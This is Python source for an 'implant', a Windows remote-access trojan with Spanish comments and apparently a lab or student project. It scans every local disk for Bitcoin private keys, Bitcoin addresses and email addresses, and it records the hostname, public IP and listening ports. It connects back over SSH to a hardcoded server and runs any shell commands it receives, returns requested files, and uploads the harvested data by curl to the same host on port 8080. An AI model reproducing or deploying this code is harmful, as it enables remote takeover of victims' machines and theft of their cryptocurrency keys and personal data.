from cryptography.fernet import Fernet
import base64

import paramiko
import subprocess
import sys
import os
import shlex
import socket
import getpass
import requests
import re
import wmi


class implant():
    def exfiltrate_info(self):
        ruta_actual = os.getcwd()
        unidad = os.path.splitdrive(ruta_actual)
        direccionesEmail = []
        BTCAddress = []
        clavesPrivadasBTC = []

        # get hostname of the machine
        ###DONE
        hostname = socket.gethostname()
            ###DONE
            
            # get the public ipv4 address of the machine
            ###DONE
        headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
            }
        public_ip = requests.get("https://ipapi.co/ip", headers = headers).text
            ###DONE


            # Conectar a la instancia WMI de Windows
        c = wmi.WMI()

            # Obtener los discos duros
        disks = [drive.DeviceID for drive in c.Win32_LogicalDisk() if drive.DriveType == 3]
        print(disks)
            # Imprimir el nombre de cada disco duro encontrado


            # search for bitcoin and email addresses

        def buscar_direcciones(texto):
            # Patron para buscar direcciones de Bitcoin
            patron_bitcoin = r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
            direcciones_bitcoin = re.findall(patron_bitcoin, texto)
            return direcciones_bitcoin

        def buscar_correos(texto):
            # Patron para buscar direcciones de correo electronico
            patron_correo = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            correos_electronicos = re.findall(patron_correo, texto)
            return correos_electronicos

        def buscar_clavePrivada(texto):
            patron_clave_privada = re.compile(r"(5[HJK][1-9A-Za-z]{49})|([LK][1-9A-Za-z]{51})|([1-9A-HJ-NP-Za-km-z]{52,53})")
            claves_bitcoin = re.findall(patron_clave_privada, texto)
            return claves_bitcoin



        def buscar_en_archivo(ruta_archivo):
            try:
                with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
                    contenido = archivo.read()
                    direcciones_bitcoin = buscar_direcciones(contenido)
                    correos_electronicos = buscar_correos(contenido)
                    clavesPrivadas = buscar_clavePrivada(contenido)
                    if direcciones_bitcoin or correos_electronicos or clavesPrivadas:
                        if direcciones_bitcoin:
                            BTCAddress.append(direcciones_bitcoin)

                        if correos_electronicos:
                            direccionesEmail.append(correos_electronicos)

                        if clavesPrivadas:
                            clavesPrivadasBTC.append(clavesPrivadas)
                        print()
            except Exception as e:
                print()
                

        def buscar_en_ruta(ruta):
            for ruta_actual, _, archivos in os.walk(ruta):
                for archivo in archivos:
                    ruta_completa = os.path.join(ruta_actual, archivo)
                    buscar_en_archivo(ruta_completa)

        # Ruta a buscar, por ejemplo: 'C:/Users/TuUsuario/Documents'
        ruta_a_buscar = str(unidad)
        for i in disks:
            buscar_en_ruta(i)
        buscar_en_ruta(ruta_a_buscar)
        # get all open ports on the machine
        open_ports = os.popen('netstat -an | findstr /R /C:"LISTENING" | findstr /R /C:"[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*').read()
        f = open("info.txt", "w")
        f.write("El hostname es " + hostname + "\n")
        f.write("La IP es " + public_ip  + "\n")
        f.write("Los correos son " + ", ".join(str(email) for email in direccionesEmail) + "\n")
        f.write("Las direcciones de BTC son " + ", ".join(str(address) for address in BTCAddress) + "\n")
        f.write("Las pass de BTC son " + ", ".join(str(clave) for clave in clavesPrivadasBTC) + "\n")
        f.write("Los puertos abiertos son " + open_ports + "\n")
    def ssh_comm(self):
        #ip del server
        ip = "192.168.0.13"
        port = 2222
        username = "sshuser"
        password = "sshpass"
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, disabled_algorithms={'pubkeys': ['rsa-sha2-256', 'rsa-sha2-512']})
        #ssh.connect(ip, port=port, username=username, password=password)
        #abrimos una session ya que es el tipo de conexion que hemos especificado
        open_ssh_session = ssh.get_transport().open_session()
        #esto para saber hostname y usuario, simplemente mas info
        h_name = socket.gethostname()
        cur_user = getpass.getuser()
        #si esta enchufado
        if open_ssh_session.active:
            open_ssh_session.send(f"El usuario es {cur_user} y el host {h_name}")
            print(open_ssh_session.recv(40960).decode())
            #todo el trafico que reciba vendra a traves del bucle este
            while True:
                command = open_ssh_session.recv(40960)
                try:
                    ssh_command = command.decode()
                    if ssh_command == "exit":
                        sys.exit()
                    #para cambiar directorios y ejecutar comandos de mas de 1 palabra
                    if ssh_command.split(" ")[0] == "cd":
                        path = ssh_command.split(" ")[1]
                        os.chdir(path)
                        curdir = os.getcwd()
                        ssh_command_output = subprocess.check_output(shlex.split(ssh_command), stderr=subprocess.STDOUT, shell=True)
                        #open_ssh_session.send(f"{curdir}")
                    #para enviar archivos del sistema
                    if ssh_command.split(" ")[0] == "get_file":
                        archivo = ssh_command.split(" ")[1]
                        filetosend = open(archivo, "rb")
                        data = filetosend.read(40960)
                        open_ssh_session.send(data)
                        filetosend.close()  
                    #modulo de exfiltracion de informacion
                    if ssh_command == "exfiltrate":
                        self.exfiltrate_info()
                        comando = 'curl -X POST -F "file=@info.txt" http://192.168.0.13:8080/info.txt'
                        open_ssh_session.send("Archivo enviado")
                        subprocess.run(comando, shell=True, check=True)  
                    else:
                        ssh_command_output = subprocess.check_output(shlex.split(ssh_command), stderr=subprocess.STDOUT, shell=True)
                        open_ssh_session.send(ssh_command_output)
                except Exception as e:
                    open_ssh_session.send("Comando invalido")
                except KeyboardInterrupt:
                    except_command = "Sesion interrumpida"
                    open_ssh_session.send(except_command)
                    quit()
        return
implant_instance = implant()
implant_instance.ssh_comm()
